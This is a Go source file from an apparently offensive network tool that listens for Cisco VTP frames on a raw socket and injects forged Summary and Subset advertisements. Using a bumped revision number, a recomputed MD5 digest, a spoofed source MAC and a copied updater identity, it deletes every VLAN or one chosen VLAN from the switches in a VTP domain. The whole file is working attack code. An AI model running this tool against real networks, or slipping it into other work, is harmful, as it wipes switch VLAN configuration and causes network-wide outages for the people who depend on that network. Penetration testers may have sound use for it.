package vtpdelete

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"time"
)

const defaultUpdater = 0x0a0d3a01 // 10.13.58.1 (default)

type rawSocket interface {
	Send(frame []byte) error
	Recv(buf []byte) (int, error)
	Close() error
}

// Deleter sends forged VTP advertisements.
type Deleter struct {
	Interface      string
	TargetVLAN     uint16 // 0 = delete all VLANs; otherwise delete this VLAN ID
	RevisionNumber int    // -1 = learned revision + 1; otherwise use this value
	SourceMAC      string // optional override; default: -I interface MAC

	sourceMACOverride net.HardwareAddr
	lastForgedRev     uint32

	lastUpdater     uint32
	lastTimestamp   [12]byte
	hasSummaryMeta  bool
	lastAttackedRev uint32
	subsetBatch     vtpSubsetBatch
}

type vtpSubsetBatch struct {
	revision  uint32
	version   byte
	domain    []byte
	domLen    int
	followers byte
	parts     map[byte][]byte
}

func (d *Deleter) Run() error {
	iface, err := net.InterfaceByName(d.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", d.Interface, err)
	}
	if len(iface.HardwareAddr) != 6 {
		return fmt.Errorf("interface %s has invalid MAC", iface.Name)
	}
	srcMAC := append(net.HardwareAddr{}, iface.HardwareAddr...)
	if d.SourceMAC != "" {
		override, err := parseMACString(d.SourceMAC)
		if err != nil {
			return fmt.Errorf("source MAC %q: %w", d.SourceMAC, err)
		}
		d.sourceMACOverride = override
	}
	sendAs := d.sendMAC(srcMAC)

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	stop := make(chan struct{})
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		close(stop)
		if d.TargetVLAN == 0 {
			fmt.Printf("\n%s Delete-all-VLANs stopped.\n", vtpTag)
		} else {
			fmt.Printf("\n%s Delete-VLAN %d stopped.\n", vtpTag, d.TargetVLAN)
		}
		os.Exit(0)
	}()

	if d.TargetVLAN == 0 {
		fmt.Printf("%s Waiting for VTP Summary/Subset on %s... (Ctrl+C to stop)\n", vtpTag, iface.Name)
	} else {
		fmt.Printf("%s Waiting for VTP Subset on %s to delete VLAN %d... (Ctrl+C to stop)\n", vtpTag, iface.Name, d.TargetVLAN)
	}
	fmt.Printf("%s Listening for VTP and DTP packets...\n", vtpTag)

	var frameNum int
	buf := make([]byte, 65535)
	for {
		select {
		case <-stop:
			return nil
		default:
		}
		n, err := sock.Recv(buf)
		if err != nil {
			select {
			case <-stop:
				return nil
			default:
				return fmt.Errorf("recv: %w", err)
			}
		}
		frame := append([]byte{}, buf[:n]...)

		d.printReceivedFrame(iface.Name, &frameNum, frame)

		if macEqual(frame[6:12], sendAs) {
			continue
		}

		if d.TargetVLAN == 0 {
			done, err := d.tryDeleteAll(sock, sendAs, frame)
			if err != nil {
				return err
			}
			_ = done
		} else {
			done, err := d.tryDeleteVlan(sock, sendAs, frame)
			if err != nil {
				return err
			}
			_ = done
		}
	}
}

// printReceivedFrame decodes and prints received VTP/DTP frames (delete-all and delete-vlan).
func (d *Deleter) printReceivedFrame(iface string, frameNum *int, frame []byte) {
	*frameNum++
	if pr, ok := printReceived(frame, iface, *frameNum); ok {
		fmt.Printf("%s Recieved data from %s:\n", pr.Tag, pr.SrcMAC)
		fmt.Printf("%s\n\n", pr.Body)
	}
}

func (d *Deleter) tryDeleteAll(sock rawSocket, srcMAC net.HardwareAddr, frame []byte) (bool, error) {
	learned, ok := parseLearnedVTP(frame)
	if !ok {
		return false, nil
	}
	if learned.Code != vtpCodeSummary && learned.Code != vtpCodeSubset {
		return false, nil
	}
	d.rememberSummaryMeta(learned)

	revision := d.forgeRevision(learned.Revision)
	if revision <= d.lastForgedRev {
		return false, nil
	}

	domain := make([]byte, vtpDomainSize)
	copy(domain, learned.Domain)
	updater, timestamp := d.forgeMeta(learned)

	digest := generateVTPMD5(updater, revision, domain, learned.DomLen, vlanCiscoDelAll, learned.Version)
	if d.RevisionNumber >= 0 {
		fmt.Printf("%s Learned domain %q revision %d — sending delete-all VLANs with revision %d as %s\n",
			vtpTag, printable(domain[:learned.DomLen]), learned.Revision, revision, formatMAC(srcMAC))
	} else {
		fmt.Printf("%s Learned domain %q revision %d — sending delete-all VLANs as %s\n",
			vtpTag, printable(domain[:learned.DomLen]), learned.Revision, formatMAC(srcMAC))
	}

	summary := buildSummaryFrame(srcMAC, learned.Version, 1, domain, learned.DomLen, revision, updater, timestamp[:], digest)
	if err := sock.Send(summary); err != nil {
		return false, fmt.Errorf("send summary: %w", err)
	}
	fmt.Printf("%s Sent VTP Summary Advertisement (delete-all)\n", vtpTag)
	time.Sleep(200 * time.Millisecond)

	subset := buildSubsetFrame(srcMAC, learned.Version, 1, domain, learned.DomLen, revision, vlanCiscoDelAll)
	if err := sock.Send(subset); err != nil {
		return false, fmt.Errorf("send subset: %w", err)
	}
	fmt.Printf("%s Sent VTP Subset Advertisement (delete-all VLAN blob)\n", vtpTag)
	d.lastForgedRev = revision
	return true, nil
}

func (d *Deleter) tryDeleteVlan(sock rawSocket, srcMAC net.HardwareAddr, frame []byte) (bool, error) {
	learned, ok := parseLearnedVTP(frame)
	if !ok {
		return false, nil
	}

	if learned.Code == vtpCodeSummary {
		d.rememberSummaryMeta(learned)
		d.beginSubsetBatch(learned)
		if learned.Followers == 0 {
			domain := make([]byte, vtpDomainSize)
			copy(domain, learned.Domain)
			req := buildRequestFrame(srcMAC, learned.Version, domain, learned.DomLen, 1)
			if err := sock.Send(req); err != nil {
				return false, fmt.Errorf("send request: %w", err)
			}
			fmt.Printf("%s No followers on Summary — sent VTP Advertisement Request\n", vtpTag)
		} else {
			fmt.Printf("%s Summary revision %d has %d Subset follower(s) — collecting...\n",
				vtpTag, learned.Revision, learned.Followers)
		}
		return false, nil
	}

	if learned.Code != vtpCodeSubset {
		return false, nil
	}

	if learned.Revision <= d.lastAttackedRev {
		return false, nil
	}

	vlanData, ok := d.collectSubsetPart(learned)
	if !ok {
		return false, nil
	}

	if !vlanInBlob(vlanData, d.TargetVLAN) {
		fmt.Printf("%s VLAN %d not in complete Subset set (VLANs present: %s) — waiting...\n",
			vtpTag, d.TargetVLAN, formatVlanIDs(vlanData))
		return false, nil
	}

	modified, err := deleteVlanFromBlob(vlanData, d.TargetVLAN)
	if err != nil {
		fmt.Printf("%s %v — waiting for another Subset...\n", vtpTag, err)
		return false, nil
	}

	domain := make([]byte, vtpDomainSize)
	copy(domain, learned.Domain)
	revision := d.forgeRevision(learned.Revision)
	updater, timestamp := d.forgeMeta(learned)

	digest := generateVTPMD5(updater, revision, domain, learned.DomLen, modified, learned.Version)
	if d.RevisionNumber >= 0 {
		fmt.Printf("%s Learned domain %q revision %d (%d VLAN entries) — sending delete VLAN %d with revision %d as %s\n",
			vtpTag, printable(domain[:learned.DomLen]), learned.Revision, countVlanEntries(vlanData), d.TargetVLAN, revision, formatMAC(srcMAC))
	} else {
		fmt.Printf("%s Learned domain %q revision %d (%d VLAN entries) — sending delete VLAN %d as %s\n",
			vtpTag, printable(domain[:learned.DomLen]), learned.Revision, countVlanEntries(vlanData), d.TargetVLAN, formatMAC(srcMAC))
	}

	summary := buildSummaryFrame(srcMAC, learned.Version, 1, domain, learned.DomLen, revision, updater, timestamp[:], digest)
	if err := sock.Send(summary); err != nil {
		return false, fmt.Errorf("send summary: %w", err)
	}
	fmt.Printf("%s Sent VTP Summary Advertisement (delete VLAN %d)\n", vtpTag, d.TargetVLAN)
	time.Sleep(200 * time.Millisecond)

	subset := buildSubsetFrame(srcMAC, learned.Version, 1, domain, learned.DomLen, revision, modified)
	if err := sock.Send(subset); err != nil {
		return false, fmt.Errorf("send subset: %w", err)
	}
	fmt.Printf("%s Sent VTP Subset Advertisement (VLAN %d removed)\n", vtpTag, d.TargetVLAN)
	d.lastAttackedRev = revision
	return true, nil
}

func (d *Deleter) forgeRevision(learned uint32) uint32 {
	if d.RevisionNumber >= 0 {
		return uint32(d.RevisionNumber)
	}
	return learned + 1
}

func (d *Deleter) sendMAC(ifaceMAC net.HardwareAddr) net.HardwareAddr {
	if len(d.sourceMACOverride) == 6 {
		return d.sourceMACOverride
	}
	return ifaceMAC
}

func parseMACString(s string) (net.HardwareAddr, error) {
	hw, err := net.ParseMAC(s)
	if err != nil {
		return nil, err
	}
	if len(hw) != 6 {
		return nil, fmt.Errorf("invalid MAC length %d", len(hw))
	}
	return hw, nil
}

func (d *Deleter) rememberSummaryMeta(learned learnedVTP) {
	if learned.Code != vtpCodeSummary {
		return
	}
	if learned.Updater != 0 {
		d.lastUpdater = learned.Updater
	}
	if learned.Timestamp != [12]byte{} {
		d.lastTimestamp = learned.Timestamp
	}
	d.hasSummaryMeta = true
}

func (d *Deleter) forgeMeta(learned learnedVTP) (uint32, [12]byte) {
	updater := uint32(defaultUpdater)
	timestamp := currentVTPTimestamp()
	if learned.Code == vtpCodeSummary {
		if learned.Updater != 0 {
			updater = learned.Updater
		}
		if learned.Timestamp != [12]byte{} {
			timestamp = learned.Timestamp
		}
	} else if d.hasSummaryMeta {
		if d.lastUpdater != 0 {
			updater = d.lastUpdater
		}
		if d.lastTimestamp != [12]byte{} {
			timestamp = d.lastTimestamp
		}
	}
	return updater, timestamp
}

func (d *Deleter) beginSubsetBatch(learned learnedVTP) {
	d.subsetBatch = vtpSubsetBatch{
		revision:  learned.Revision,
		version:   learned.Version,
		domain:    append([]byte{}, learned.Domain...),
		domLen:    learned.DomLen,
		followers: learned.Followers,
		parts:     make(map[byte][]byte),
	}
}

func (d *Deleter) collectSubsetPart(learned learnedVTP) ([]byte, bool) {
	if d.subsetBatch.parts == nil {
		d.beginSubsetBatch(learned)
		d.subsetBatch.followers = 1
	}
	b := &d.subsetBatch
	if learned.Revision != b.revision {
		d.beginSubsetBatch(learned)
		b = &d.subsetBatch
		b.followers = maxByte(b.followers, 1)
	}
	if b.followers == 0 {
		b.followers = 1
	}
	if learned.Seq == 0 {
		learned.Seq = 1
	}
	b.parts[learned.Seq] = append([]byte{}, learned.VlanData...)
	if len(b.parts) < int(b.followers) {
		fmt.Printf("%s Collected Subset seq %d/%d (VLANs: %s)\n",
			vtpTag, learned.Seq, b.followers, formatVlanIDs(learned.VlanData))
		return nil, false
	}
	for seq := byte(1); seq <= b.followers; seq++ {
		if _, ok := b.parts[seq]; !ok {
			fmt.Printf("%s Waiting for Subset seq %d/%d...\n", vtpTag, seq, b.followers)
			return nil, false
		}
	}
	merged := mergeSubsetParts(b.parts, b.followers)
	fmt.Printf("%s Merged %d Subset packet(s), %d VLAN entries total\n",
		vtpTag, b.followers, countVlanEntries(merged))
	d.subsetBatch.parts = nil
	return merged, true
}

func maxByte(a, b byte) byte {
	if a > b {
		return a
	}
	return b
}

func currentVTPTimestamp() [12]byte {
	var ts [12]byte
	now := time.Now().UTC()
	s := fmt.Sprintf("%02d%02d%02d%02d%02d%02d",
		now.Year()%100, int(now.Month()), now.Day(),
		now.Hour(), now.Minute(), now.Second())
	copy(ts[:], s)
	return ts
}
